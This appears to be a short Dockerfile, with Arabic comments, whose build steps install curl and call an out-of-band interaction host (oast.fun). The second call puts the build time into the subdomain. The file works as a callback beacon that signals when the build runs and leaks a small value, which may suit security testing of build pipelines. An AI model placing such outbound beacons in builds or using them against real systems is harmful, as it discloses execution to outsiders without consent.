FROM alpine:latest

# نزل Curl ونفذ الأمر الأول
RUN apk add --no-cache curl && curl http://d526s3o3t4gglckn7dd07zq887iocppah.oast.fun/docker_init

# الأمر التاني مع الوقت (لازم يكون جوه RUN وتستخدم الـ Command Substitution صح)
RUN export CURRENT_TIME=$(date +%H-%M-%S) && curl "http://${CURRENT_TIME}.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun/docker_time"
